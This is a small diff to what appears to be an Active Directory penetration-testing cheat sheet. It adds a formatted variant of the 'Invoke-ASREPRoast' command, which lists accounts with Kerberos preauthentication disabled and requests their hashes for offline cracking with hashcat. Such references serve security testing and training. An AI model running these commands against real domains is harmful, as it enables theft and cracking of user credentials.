@@ -836,6 +836,7 @@ Get-ASREPHash -Username <username> -Verbose
 #### Enumerate all users with kerberos preauth disabled and request a hash
 ```
 Invoke-ASREPRoast -Verbose
+Invoke-ASREPRoast -Verbose | fl
 ```
 
 #### Crack the hash with hashcat
